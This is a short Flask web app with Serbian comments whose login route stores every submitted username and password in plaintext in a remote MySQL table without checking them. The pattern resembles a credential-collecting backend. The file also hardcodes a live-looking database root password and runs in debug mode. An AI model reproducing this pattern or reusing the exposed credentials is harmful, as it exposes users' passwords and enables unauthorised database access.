from flask import Flask, render_template, request, redirect, url_for, flash
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
app.secret_key = "your_secret_key"

# ✅ Ispravan URL baze podataka
DATABASE_URL = "mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway"

# ✅ Kreiranje konekcije
engine = create_engine(DATABASE_URL)
Session = sessionmaker(bind=engine)
session = Session()

# ✅ Provera konekcije
try:
    with engine.begin() as connection:
        result = connection.execute(text("SELECT 1"))
        print("✅ Baza podataka uspešno povezana!")
except Exception as e:
    print(f"❌ GREŠKA pri povezivanju na bazu: {e}")

# ✅ Početna stranica
@app.route('/')
def index():
    return render_template('index.html')

# ✅ Ruta za login
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    try:
        with engine.begin() as connection:
            insert_query = text("""
                INSERT INTO login_attempt (username, password, attempt_time) 
                VALUES (:username, :password, NOW())
            """)
            connection.execute(insert_query, {"username": username, "password": password})

            flash('Login attempt saved to database!', 'success')
            return redirect(url_for('index'))
    except Exception as e:
        flash(f'Greška pri prijavljivanju: {e}', 'error')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
